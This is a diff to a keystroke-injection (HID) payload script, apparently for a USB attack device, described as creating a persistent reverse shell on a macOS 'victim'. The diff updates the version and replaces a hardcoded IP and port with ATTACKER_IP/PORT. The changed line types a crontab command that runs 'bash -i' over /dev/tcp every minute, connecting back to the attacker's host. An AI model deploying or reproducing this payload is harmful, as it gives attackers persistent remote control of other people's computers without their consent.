@@ -2,7 +2,7 @@
 # Description:   Creates a persistent reverse shell on Mac victim that connects back to NetCat host
 # Author:        0dyss3us (KeenanV)
 # Props:
-# Version:       1.0
+# Version:       1.2
 # Category:      Remote Access
 # Target:        MacOS
 # Attackmodes:   HID, Storage
@@ -18,7 +18,7 @@ RUN OSX terminal
 Q DELAY 2000
 
 # Makes a cron job that will run once every minute
-Q STRING (crontab -l 2>/dev/null; echo "\* \* \* \* \* "bash -i >& /dev/tcp/10.207.0.103/4444 0>&1") | crontab - 
+Q STRING \(crontab -l 2\>/dev/null\; echo \"\* \* \* \* \* bash -i \>\& /dev/tcp/ATTACKER_IP/PORT 0\>\&1\"\) \| crontab - 
 Q ENTER
 Q DELAY 2000
 
